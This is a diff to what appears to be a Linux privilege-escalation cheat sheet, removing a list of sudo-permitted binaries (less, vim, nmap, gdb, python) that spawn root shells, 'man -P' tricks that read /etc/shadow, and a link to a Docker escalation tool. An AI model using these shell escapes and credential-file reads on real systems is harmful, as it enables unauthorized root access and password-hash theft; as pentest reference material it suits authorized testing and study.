@@ -144,26 +144,6 @@ sudo -l | grep vi
 ```bash
 cat /etc/sudoers
 ```
-##### Common Sudo Binaries to Establish root Shells
-```bash
-less (!sh)
-more (!sh)
-VIM/VIM (:!sh)
-nmap (--interactive + !sh)
-ftp (!sh)
-gdb (!sh)
-python
-Perl
-lrb
-lua
-```
-##### Common Sudo Binaries to Execute Commands
-```bash
-man -P "id" man
-man -P "cat /etc/shadow" man
-```
-##### Docker
-[dockerevil](https://github.com/pyperanger/dockerevil)
 
 ### SUID / GUID
 ##### Check if Binary is SUID/GUID
